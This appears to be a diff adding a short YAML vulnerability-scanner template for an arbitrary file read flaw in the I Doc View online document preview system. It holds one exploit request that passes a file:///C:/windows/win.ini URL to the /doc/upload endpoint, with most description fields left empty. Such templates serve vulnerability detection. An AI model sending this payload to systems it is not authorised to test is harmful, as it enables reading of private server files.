@@ -1,0 +1,16 @@
+id:
+info:
+  name: I Doc View在线文档预览系统任意文件读取漏洞
+  severity: 4
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt
+response1:
+  headers:
+  body: src
+  code:
+requests2:
+response2:
